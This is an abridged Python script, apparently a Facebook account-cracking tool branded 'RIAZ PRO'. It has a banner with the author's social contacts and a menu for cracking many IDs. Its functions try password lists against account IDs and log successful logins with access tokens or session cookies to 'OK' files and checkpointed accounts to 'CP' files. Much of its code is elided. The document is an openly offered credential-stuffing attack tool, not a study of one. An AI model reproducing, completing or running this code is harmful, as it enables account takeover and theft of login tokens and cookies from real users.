...
.........::::.....::::.........::.........::
\x1b[0;32m╔════════════════════════════════════════════╗
\x1b[0;33m║WELCOME TO RIAZKHAN  TOOLS DEVELOPED BY RIAZ KHAN ║
\x1b[0;33m║       #TOOL AUTHOR [RIAZ_KHAN] SIMPLE BOY BD. ║
\x1b[0;33m╚════════════════════════════════════════════╝
\x1b[0;33m ---------------------------------------------
\x1b[0;33m╔════════════════════════════════════════════╗
\x1b[0;33m║#WEBSITE     : FOLLOW MY FACEBOOK TO FIND IT.║
\x1b[0;33m║#FACEBOOK : https://www.facebook.com/Riaz-hacker-100835532473815/     ║
\x1b[0;33m║#GITHUB : https://github.com/Riazkiller                    ║
\x1b[0;33m║#WHATSAPP : 03188214452                                        ║
\x1b[0;33m╚════════════════════════════════════════════╝""")
def login():
	os.system("clear")
	try:
...
def menu():
	...
	print("\033[1;93m[\033[1;94m03\033[1;97m] MULTIPLE-ID's CRACK\033[1;93m [ \033[1;95mRIAZ PRO \033[1;97m]")
	print("\033[1;93m[\033[1;94m04\033[1;97m] Check Crack Results")
	print("\033[1;93m[\033[1;94m05\033[1;97m] USER-AGENT SETTINGS\033[1;97m [ \033[1;95mRIAZ PRO \033[1;97m]")
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mRIAZ  PRO/FASTER \033[1;97m]")
	...
	if method == "":
		...
		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] DO YOU CHOOSE MANUAL PASSWORD y/t\033[1;97m [ \033[1;96mDefault : N \033[1;97m] : ")
		if ask == "y":
			manual()
		print(" ")
		...
		ask = raw_input("\033[1;96m[\033[1;94m03\033[1;97m] DO YOU CHOOSE MANUAL PASSWORD y/t\033[1;97m [ \033[1;96mDefault : N \033[1;97m] ")
		if ask == "y":
			manual()
		print(" ")
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[RIAZ-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[0;94m[RIAZ-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[0;95m[RIAZ-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[RIAZ-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;95m[RIAZ-CP] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def mobile(user):
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;94m[RIAZ-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;95m[RIAZ-CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
